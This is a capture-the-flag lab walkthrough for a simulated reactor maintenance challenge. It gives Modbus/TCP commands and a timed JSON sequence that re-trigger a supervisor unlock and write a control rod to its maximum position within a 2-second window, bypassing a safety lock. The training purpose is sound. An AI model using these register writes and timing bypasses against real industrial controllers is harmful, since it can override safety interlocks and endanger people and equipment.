# Challenge 07 — Maintenance Override

**Protocol:** Modbus/TCP · **Port:** 502/tcp · **Toolkit module:** `modbus`

---

## The Story

The reactor has a special maintenance mode that allows engineers to change the maintenance rod position.

However, this mode is protected by a supervisor lock. You cannot change the rod whenever you want. First, you must unlock the system.

There is a catch: the unlock stays active for only about 2 seconds!

A background system also keeps checking whether the rod is at its previously approved position. If you change the rod while the unlock is active, the system can accept the new position. If you are too late, it changes the rod back to its original value.

Your mission is to unlock the system, move the rod to its maximum position of `100`, make the system accept that change, and keep it stable for approximately 10 seconds.

---

## What Is Happening?

Before starting, understand the four important registers.

| Register | Name | Purpose |
|---|---|---|
| HR20 | Supervisor Unlock | Opens the maintenance lock. |
| HR21 | Maintenance Rod | Controls the rod position. |
| IR73 | Last Authorised Value | Shows which rod position the system accepts. |
| IR74 | Solve Status | Shows whether the challenge condition is satisfied. |

There are also two other important registers:

- **IR72:** Shows how much unlock time is remaining.
- **IR48:** Contains the challenge flag after successful completion.

### Important values

| Item | Value |
|---|---:|
| Original rod position | 10 |
| Maximum rod position | 100 |
| Unlock duration | Approximately 2 seconds |
| Required stable time | Approximately 10 seconds |

**Our goal:** Change the rod from `10` to `100` and make IR73 also show `100`.

## Step 1: Connect to the Target and Read the Registers

### What are we doing?

First, we connect to the target and check the available registers.

We need to understand the current state of the maintenance system before changing anything.

### Commands

```bash
./bin/sysrupt target set 10.0.1.1

./bin/sysrupt modbus read-input 0 16

./bin/sysrupt modbus read-input 70 6
```

### What each command does

- `target set` selects the target device.
- `read-input 0 16` reads the first 16 input registers.
- `read-input 70 6` reads registers 70 to 75, where the maintenance status information is stored.

## Step 2: Understand the Unlock System

### What are we doing?

Before changing the maintenance rod, we must unlock the supervisor lock.

Let's first try changing the rod without unlocking it.

### Commands

```bash
./bin/sysrupt modbus write 21 100
```

Now try opening the unlock:

```bash
./bin/sysrupt modbus write 20 1
```

Check how much time is remaining:

```bash
./bin/sysrupt modbus read-input 72 1
```

### What is happening?

- Register `20` controls the unlock.
- Writing `1` requests an unlock.
- Register `72` tells us how much unlock time remains.
- Register `21` controls the maintenance rod.

<details>
<summary>Show result and explanation</summary>

When we try changing the rod without unlocking it, the request is rejected.

This happens because the system protects the maintenance rod from unauthorized changes.

The unlock lasts approximately 2 seconds.

That means we must change the rod quickly after opening the lock.

</details>

## Step 3: Understand the Two Important Problems

There are two things that can make our attempt fail.

### Problem 1: The unlock needs a fresh signal

The unlock works only when its value changes from:

```text
0 → 1
```

This is called a **rising edge**.

Think of it like pressing a button.

If the button is already ON, pressing ON again does not create a new button press.

The same thing happens here.

So, before unlocking, we must first set the register back to `0`.

```bash
./bin/sysrupt modbus write 20 0
```

Now the next write of `1` creates a fresh unlock signal.

### Problem 2: We have very little time

The unlock lasts only around 2 seconds.

Running separate commands manually can take too long.

For example:

1. Unlock the system.
2. Wait for the command to finish.
3. Type the rod command.
4. Send the rod command.

By then, the unlock may have expired.

**Solution:** We use the toolkit's `sequence` feature.

It allows us to execute multiple commands in the correct order over one connection.

---

## Step 4: Create the Timed Sequence

### What are we doing?

We are going to create a small JSON file containing all the commands.

The sequence will:

1. Turn the unlock OFF.
2. Turn the unlock ON.
3. Set the maintenance rod to `100`.
4. Wait briefly.
5. Check whether the system accepted the new rod position.

### Create the file

```bash
nano maint.seq.json
```

Paste this:

```json
{
  "name": "maint-override",
  "steps": [
    { "command": "modbus write 20 0" },
    { "command": "modbus write 20 1", "deadline_ms": 1000 },
    { "command": "modbus write 21 100", "deadline_ms": 1800 },
    { "command": "modbus verify 73 100 --input", "delay_before_ms": 400 }
  ]
}
```

Save the file.

### Understand the commands

**Command 1:**

```bash
modbus write 20 0
```

Turns the unlock OFF so that we can create a fresh unlock signal.

**Command 2:**

```bash
modbus write 20 1
```

Opens the supervisor lock.

**Command 3:**

```bash
modbus write 21 100
```

Changes the maintenance rod to its maximum position of `100`.

**Command 4:**

```bash
modbus verify 73 100 --input
```

Checks whether register 73 contains `100`.

This is important because we need to know whether the system has accepted our new rod position.

### What do deadline and delay mean?

| Parameter | Meaning |
|---|---|
| `deadline_ms` | The command must finish within the specified time after the sequence starts. |
| `delay_before_ms` | Wait for the specified time before running that command. |

For example:

```json
"delay_before_ms": 400
```

Means wait 400 milliseconds before checking register 73.

This gives the background system time to recognize the new rod position.

### Validate and execute the sequence

First, check whether the JSON file is correct:

```bash
./bin/sysrupt sequence validate maint.seq.json
```

Then execute it:

```bash
./bin/sysrupt sequence run maint.seq.json
```

## Step 5: Check Whether the System Accepted the New Position

### What are we doing?

Changing the rod to `100` does not automatically mean the system has accepted the change.

Remember, the background system keeps checking the rod position.

We need to verify that the last authorised position has also changed from `10` to `100`.

### Command

```bash
./bin/sysrupt modbus verify 73 100 --input
```

### What does this command do?

It checks whether input register `73` contains the value `100`.

If it does, the background system has recognised the new rod position as authorised.

<details>
<summary>Show result and explanation</summary>

The expected result is:

```text
IR73 = 100
```

This means the system now treats `100` as the authorised rod position instead of the original value `10`.

</details>

## Step 6: Wait for the Challenge to Complete

### What are we doing?

The system needs the new authorised rod position to remain stable for approximately 10 seconds.

We should not change the rod or repeat the unlock sequence during this period.

### Wait

```bash
sleep 11
```

This waits for 11 seconds.

### Check the solve status

```bash
./bin/sysrupt modbus read-input 74 1
```

We expect:

```text
[1]
```

A value of `1` means the solve condition has been satisfied.

### Retrieve the flag

```bash
./bin/sysrupt modbus read-input 48 16
```

The flag is stored in the ASCII output of these registers.

</details>

## Important Things to Remember

1. Always write `0` to HR20 before writing `1`. The unlock needs a fresh rising edge.
2. The unlock stays active for only around 2 seconds.
3. Use the sequence file instead of manually typing commands one by one.
4. Check IR73 to confirm that the new rod position was accepted.
5. Do not change the rod after it has been accepted.
6. Wait approximately 10 seconds before checking the solve status.
7. Avoid repeatedly opening the unlock. More than 6 rising edges within approximately 2 seconds can trigger a temporary maintenance lockout.

---

## What We Learned

- **Modbus Holding Registers:** Used to control equipment, such as the supervisor unlock and maintenance rod.
- **Input Registers:** Used to read information, such as the unlock timer and solve status.
- **Rising Edge:** A signal change from `0` to `1`. Some systems respond only to this change.
- **TOCTOU:** A timing problem where something is checked at one moment but changes before the operation finishes.
- **Sequence Engine:** Allows multiple commands to execute in a fixed order over one connection.
- **State Verification:** We must check whether the system actually accepted a change instead of trusting only the write response.
